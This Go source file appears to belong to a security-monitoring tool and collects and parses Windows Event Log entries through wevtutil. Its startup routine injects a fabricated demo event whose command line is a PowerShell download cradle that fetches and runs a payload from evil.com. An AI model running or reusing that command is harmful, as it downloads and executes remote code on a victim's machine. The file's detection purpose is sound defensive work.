//go:build windows
// +build windows

package collector

import (
	"context"
	"encoding/xml"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/nullsector/null-log/pkg/models"
)

// WindowsEventCollector collects Windows Event Log entries
type WindowsEventCollector struct {
	channels []string
}

// NewWindowsEventCollector creates a new Windows collector
func NewWindowsEventCollector() *WindowsEventCollector {
	return &WindowsEventCollector{
		channels: []string{
			"Security",
			"System",
			"Application",
			"Microsoft-Windows-PowerShell/Operational",
			"Microsoft-Windows-Sysmon/Operational",
		},
	}
}

func (w *WindowsEventCollector) Name() string {
	return "Windows Event Log"
}

func (w *WindowsEventCollector) IsAvailable() bool {
	// Check if wevtutil exists
	cmd := exec.Command("wevtutil", "qe", "System", "/c:1", "/f:xml")
	return cmd.Run() == nil
}

func (w *WindowsEventCollector) Start(ctx context.Context, events chan<- *models.Event) error {
	// Send startup test event immediately so users see activity
	go func() {
		time.Sleep(500 * time.Millisecond)
		events <- &models.Event{
			ID:          "startup_1",
			Timestamp:   time.Now(),
			Source:      "null.log",
			EventType:   "ServiceStarted",
			ProcessName: "null-log.exe",
			ProcessID:   os.Getpid(),
			User:        os.Getenv("USERNAME"),
			CommandLine: strings.Join(os.Args, " "),
			RawLog:      "null.log security monitoring started",
			Metadata: map[string]interface{}{
				"status":   "monitoring_active",
				"platform": runtime.GOOS,
				"version":  "1.0.0",
			},
		}
		
		// Generate a test suspicious event for demo
		time.Sleep(2 * time.Second)
		events <- &models.Event{
			ID:          "test_suspicious_1",
			Timestamp:   time.Now(),
			Source:      "Security",
			EventType:   "ProcessCreation",
			ProcessName: "powershell.exe",
			ProcessID:   12345,
			User:        os.Getenv("USERNAME"),
			CommandLine: "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\"",
			RawLog:      "Suspicious PowerShell execution detected",
			Metadata: map[string]interface{}{
				"EventID":         4688,
				"ProcessCreation": true,
			},
		}
	}()
	
	for _, channel := range w.channels {
		go w.collectChannel(ctx, channel, events)
	}
	<-ctx.Done()
	return nil
}

func (w *WindowsEventCollector) collectChannel(ctx context.Context, channel string, events chan<- *models.Event) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	
	lastEventID := w.getLatestEventID(channel)

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			newEvents := w.fetchNewEvents(channel, lastEventID)
			for _, evt := range newEvents {
				events <- evt
				if evt.ID > lastEventID {
					lastEventID = evt.ID
				}
			}
		}
	}
}

func (w *WindowsEventCollector) getLatestEventID(channel string) string {
	cmd := exec.Command("wevtutil", "qe", channel, "/c:1", "/rd:true", "/f:text")
	output, err := cmd.Output()
	if err != nil {
		return "0"
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "Event ID:") {
			parts := strings.Fields(line)
			if len(parts) >= 3 {
				return parts[2]
			}
		}
	}
	return "0"
}

type WindowsEvent struct {
	System struct {
		EventID       int       `xml:"EventID"`
		TimeCreated   struct {
			SystemTime string `xml:"SystemTime,attr"`
		} `xml:"TimeCreated"`
		Computer      string `xml:"Computer"`
		Channel       string `xml:"Channel"`
	} `xml:"System"`
	EventData struct {
		Data []struct {
			Name  string `xml:"Name,attr"`
			Value string `xml:",chardata"`
		} `xml:"Data"`
	} `xml:"EventData"`
}

func (w *WindowsEventCollector) fetchNewEvents(channel string, afterID string) []*models.Event {
	// Query events with XML format for structured parsing
	query := fmt.Sprintf("*[System[EventID>%s]]", afterID)
	cmd := exec.Command("wevtutil", "qe", channel, "/q:"+query, "/c:50", "/rd:false", "/f:xml")
	
	output, err := cmd.Output()
	if err != nil {
		return nil
	}

	return w.parseWindowsEvents(string(output), channel)
}

func (w *WindowsEventCollector) parseWindowsEvents(xmlData string, channel string) []*models.Event {
	var events []*models.Event
	
	// Split by <Event> tags
	parts := strings.Split(xmlData, "<Event")
	for _, part := range parts[1:] {
		eventXML := "<Event" + part
		var winEvt WindowsEvent
		
		if err := xml.Unmarshal([]byte(eventXML), &winEvt); err != nil {
			continue
		}

		evt := &models.Event{
			ID:        strconv.Itoa(winEvt.System.EventID),
			Source:    channel,
			EventType: fmt.Sprintf("EventID_%d", winEvt.System.EventID),
			RawLog:    eventXML,
			Metadata:  make(map[string]interface{}),
		}

		// Parse timestamp
		if t, err := time.Parse(time.RFC3339, winEvt.System.TimeCreated.SystemTime); err == nil {
			evt.Timestamp = t
		} else {
			evt.Timestamp = time.Now()
		}

		// Extract event data fields
		for _, data := range winEvt.EventData.Data {
			evt.Metadata[data.Name] = data.Value
			
			switch data.Name {
			case "SubjectUserName", "TargetUserName":
				evt.User = data.Value
			case "ProcessName", "NewProcessName":
				evt.ProcessName = data.Value
			case "ProcessId":
				if pid, err := strconv.Atoi(data.Value); err == nil {
					evt.ProcessID = pid
				}
			case "CommandLine":
				evt.CommandLine = data.Value
			case "IpAddress":
				evt.RemoteIP = data.Value
			case "IpPort":
				if port, err := strconv.Atoi(data.Value); err == nil {
					evt.RemotePort = port
				}
			}
		}

		events = append(events, evt)
	}

	return events
}
